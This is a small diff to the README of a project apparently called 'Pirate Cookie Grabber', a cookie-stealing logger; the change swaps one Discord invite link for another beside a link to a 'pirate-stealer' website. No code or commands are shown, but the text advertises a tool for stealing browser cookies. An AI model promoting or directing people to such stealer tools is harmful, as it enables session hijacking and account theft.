@@ -1,4 +1,4 @@
-# [Our Website (click here)](https://pirate-stealer.carrd.co) | [Our Discord Server (22/1/2025)](https://discord.gg/J66RJ4R4)
+# [Our Website (click here)](https://pirate-stealer.carrd.co) | [Our Discord Server (2025)](https://discord.gg/QNmgUZmk)
 
 # Pirate Cookie Grabber Showcase (This Project/Logger)
 ![image](https://github.com/Mani175/Pirate-Cookie-Grabber/assets/60432696/68100ff2-790f-4d36-91ab-25bd3ab79884)
